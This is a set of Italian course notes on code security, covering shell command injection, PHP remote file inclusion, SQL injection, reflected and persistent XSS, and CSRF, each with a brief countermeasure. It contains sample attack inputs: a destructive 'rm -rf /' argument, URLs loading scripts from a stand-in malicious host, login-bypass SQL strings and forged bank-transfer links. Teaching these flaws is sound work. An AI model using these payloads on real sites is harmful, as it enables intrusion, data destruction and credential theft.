## [1] Sicurezza del codice

### Code injection

#### Bash
```sh
#!/bin/sh
echo $1
```
```sh
prova.sh 'rm -rf /'
```
##### Come evitare l'attacco?
Fare il controllo dell'input non fidato o evitare proprio di scrivere bash che girano su input non fidato.

#### Remote file inclusion
Per permettere facilitare il templating basato su routing una possibile soluzione potrebbe essere questa:

```
https://example.com?template=home
https://example.com?template=details
```

```php
<?php include($_GET['template'] . '.php');
```

Possibile exploit:
```
https://example.com?template=http://malicious.com/evil.php
```

##### Come evitare l'attacco?
Fare il controllo dell'input non fidato.

#### SQL injection
```php
$query= "SELECT role FROM user WHERE name='$name' AND password='$pwd'"; 
```

##### SQL injection (Exploit 1)
Con questo exploit è possibile autenticarsi come administrator senza conoscerne la password:

```
https://example.com/login.php?name=administrator'%20---
```
```sql
SELECT role FROM user WHERE name='administrator' ---' AND password='$pwd'
```
##### SQL injection (Exploit 2)
Con questo exploit invece neanche serve conoscere il nome utente:

```
https://example.com/login.php?name=idontknow'%20OR%201=1%20--
```
```sql
SELECT role FROM user WHERE name='idontlnow' OR 1=1 ---' AND password='$pwd'
```

##### Come evitare l'attacco?
Fare il controllo dell'input non fidato. Ad esempio fare l'escape di caratteri speciali.

### XSS (cross site scripting)

Gli attacchi cross site scripting consistono nell'iniettare codice malevolo in una pagina web. Generalmente il codice iniettato è Javascript. Javascript consente di modificare completamente il DOM. Per esempio è possibile modificare l'indirizzo http dell'action di una form di autenticazione. Questo fa si che quando l'utente inserisce le credenziali di accesso, esse vengano inviate non a un server sicuro, ma al server dell'hacker che in questo modo ottiene le credenziali di accesso. Esistono due tipologie di attacchi XSS, non persistenti e persistenti. 

#### non-persistent XSS
Questo attacco si dice non persistente in quanto non inietta permanentemente lo script nella pagina. Questo significa che la vittima deve accedere a un certo sito internet di cui si fida, mediante un indirizzo costruito ad hoc dall'attaccante. Questo è comunque problematico, in quanto l'utente controllando esclusivamente dominio e eventuale certificato SSL si fida e non può rendersi conto facilmente di trovarsi in un sito internet compromesso.

```php
<h1>Ciao, <?php echo $_GET['nome_utente']; ?></h1>
```
```
https://example.com/welcome.php?nome_utente=%3Cscript%20src=%22http://malicious.com/evil.js%22%3E%3C/script%3E"
```
```html
<h1>Ciao, <script src="http://malicious.com/evil.js"></script></h1>
```

#### persistent XSS
Identico al precedente attacco, ma il codice malevolo iniettato è permanente e visibile a chiunque visiti un certo sito internet compromesso. Questo significa che con questa tipologia di attacco non è neanche necessario accedere a un sito internet fidato mediante un particolare indirizzo http. Questo genere di attacchi può avvenire in quei siti internet che hanno guest book o che permettono di pubblicare un commento formattato con l'html.

##### Come evitare l'attacco?
Fare il controllo dell'input non fidato. In alternativa i browser moderni fanno detection di attacchi XSS client side. In passato però la XSS protection dei browser è stata spesso aggirata.


### CSRF (cross site request forgery)
```
<a href="http://securebank.com/bonifico?account=bob&amount=1000000&for=Fred">clicca qui</a> 
```
Se l'utente è già loggato, nel momento in cui fa click sul link, parte il bonifico di $1000000.

È possibile anche evitare di richiedere l'azione da parte dell'utente.

```
<img src="http://securebank.com/bonifico?account=bob&amount=1000000&for=Fred">clicca qui</a> 
```

L'immagine infatti viene caricata appena l'utente apre la pagina nel browser.

#### Contromisura
Controllare sempre il referrer header, ovvero l'indirizzo di provenienza. 